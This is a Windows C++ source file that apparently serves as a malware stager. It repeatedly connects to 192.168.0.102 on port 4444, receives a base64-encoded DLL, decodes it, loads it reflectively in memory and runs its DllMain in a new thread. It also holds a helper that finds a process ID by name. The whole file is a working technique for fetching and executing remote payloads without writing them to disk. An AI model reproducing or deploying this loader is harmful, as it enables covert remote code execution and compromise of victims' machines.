#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include "base64.h"
#include <Tlhelp32.h>
#include "MemoryLoadDll.h"

#pragma comment(lib, "ws2_32.lib")

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}

int main(int argc,char* argv[])
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in clientService;
	int iResult = 0;

	clientService.sin_family = AF_INET;
#pragma warning(disable : 4996)
	clientService.sin_addr.s_addr = inet_addr("192.168.0.102");
	clientService.sin_port = htons(4444);
	do
	{
		iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
		Sleep(5);
		
	} while (iResult==SOCKET_ERROR);
	

	INT RecvBytes = 0;
	char* bufferReceivedBytes = new char[10000];
	char* DecodeBytes = new char[5120];

	RecvBytes = recv(ConnectSocket, bufferReceivedBytes, 10000, NULL);
	
	INT dwFileSize = 0;
	//接收base64编码后的dll
	dwFileSize = b64_decode((unsigned char*)bufferReceivedBytes, RecvBytes, (unsigned char *)DecodeBytes);
	//解码dll写入DecodeBytes

	LPVOID lpBaseAddress = MmLoadLibrary(DecodeBytes, dwFileSize);

	typedef BOOL(*typedef_dllmain)(void);
	FARPROC dllmain = (FARPROC)MmGetProcAddress(lpBaseAddress, (PCHAR)"DllMain");
	CreateThread(0, 0,(LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
	

	iResult = closesocket(ConnectSocket);
	WSACleanup();
	return 0;
}